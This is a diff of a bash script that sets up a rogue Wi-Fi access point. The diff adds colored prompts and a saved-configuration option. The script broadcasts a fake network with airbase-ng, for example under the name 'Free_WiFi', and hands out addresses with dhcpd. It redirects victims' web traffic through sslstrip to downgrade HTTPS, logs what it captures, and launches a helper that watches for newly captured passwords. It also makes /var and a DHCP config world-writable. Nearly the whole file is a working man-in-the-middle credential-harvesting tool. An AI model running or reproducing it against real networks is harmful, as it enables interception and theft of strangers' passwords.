@@ -3,7 +3,21 @@
 # Colored dialogs
 GREEN="\033[1;32m"
 RED="\033[1;31m"
-END="\033[1;37m"
+END="\033[0;37m"
+
+PREFIX=" \033[1;31m[+] \033[0;32m"
+SUFIX=$END
+
+my_echo ()
+{
+    echo -e "$PREFIX$1$SUFIX"
+}
+
+my_read ()
+{
+    echo -ne "\033[1;37m\t> \033[0;37m"
+    read $1
+}
 
 DIRECTORY="history"
 OUT_FILE=$DIRECTORY/`date +%G-%m-%d-%H:%M:%S`
@@ -12,55 +26,70 @@ if [ ! -d "$DIRECTORY" ]; then
     mkdir $DIRECTORY
 fi
 
+my_echo "Stoping dhcpd, tcpdump, airbase-ng, dhcpd3, appache2..."
 killall -9 dhcpd tcpdump airbase-ng dhcpd3
-service apache2 stop
-airmon-ng stop wlan1
-airmon-ng stop wlan0
-airmon-ng stop mon0
-airmon-ng stop mon1
-airmon-ng stop mon2
+service apache2 stop 
+my_echo "Unmounting all network devices..."
+airmon-ng stop wlan1	> ./rogueAP.log
+airmon-ng stop wlan0	>> ./rogueAP.log
+airmon-ng stop mon0	>> ./rogueAP.log
+airmon-ng stop mon1	>> ./rogueAP.log
+airmon-ng stop mon2	>> ./rogueAP.log
 # airmon-ng stop mon3
 # airmon-ng stop mon4
 # airmon-ng stop mon5
 # airmon-ng stop mon6
+my_echo "Loading rtl8187 driver..."
 # rmmod rtl8187
 # modprobe r8187se
 modprobe rtl8187
 echo 1 > /proc/sys/net/ipv4/ip_forward;
 
 if [[ $1 = "--new" ]]; then
-    echo ">>> Interface Rogue ? ";
-    read WIFACE
-    echo
-    echo
-    echo ">>> Nom de la Rogue_AP ? "
-    read NAME_AP
-    echo
-    echo
-    echo ">>> Channel de la Rogue_AP ?"
-    read CHANNEL
-    echo
-    echo
-    echo ">>> Interface possedant internet ?"
-    read NET_INTERFACE
+    my_echo "Rogue AP name? (exemple: 'Free_WiFi') "
+    my_read NAME_AP
+    my_echo "Rogue wifi network interface? (exemple: 'wlan0') ";
+    my_read WIFACE
+    my_echo "Rogue AP channel? (exemple: '11') "
+    my_read CHANNEL
+    my_echo "Network interface with internet? (exemple: 'eth0') "
+    my_read NET_INTERFACE
+    echo ""
+    my_echo "Your configuration:"
+    echo -e "\tNAME_AP=$NAME_AP"
+    echo -e "\tWIFACE=$WIFACE"
+    echo -e "\tCHANNEL=$CHANNEL"
+    echo -e "\tNET_INTERFACE=$NET_INTERFACE"
+    echo ""
+    my_echo "Do you want to save this configuration to use it next time? (y/n)"
+    my_read save
+
+    if [[ $save = 'y' ]]; then
+	echo "#!/bin/bash"			>  rogueAP.conf
+	echo ""					>> rogueAP.conf
+	echo "NAME_AP=$NAME_AP"			>> rogueAP.conf
+	echo "WIFACE=$WIFACE"			>> rogueAP.conf
+	echo "CHANNEL=$CHANNEL"			>> rogueAP.conf
+	echo "NET_INTERFACE=$NET_INTERFACE"	>> rogueAP.conf
+    fi
 else
     source ./rogueAP.conf
 fi
 
+my_echo "Starting network interface..."
 airmon-ng start $WIFACE;
 modprobe tun;
 
 xterm -hold -e airbase-ng -P -C 30 -c $CHANNEL -e $NAME_AP -v $WIFACE &>/dev/null &
 sleep 2
 
-echo ">>> SCRIPT EN COURS D'ÉXÉCUTION <<<"
 modprobe tun ;
 ifconfig at0 up ;
 ifconfig at0 10.0.0.1 netmask 255.255.255.0 ;
 ifconfig at0 mtu 1400 ;
 route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1 ;
 
-service apache2 start;
+#service apache2 start;
 
 chmod 777 /var && chmod 777 /var/run && chmod 777 /etc/dhcp3/dhcpd.conf
 xterm -hold -e dhcpd3 -d -f -cf /etc/dhcp3/dhcpd.conf  &> /dev/null &
@@ -87,3 +116,5 @@ iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port
 xterm -hold -e sslstrip -w $OUT_FILE -a -f -k &
 
 xterm -hold -e ./watch_new_password.sh $OUT_FILE &
+
+my_echo "RogueAP Started"
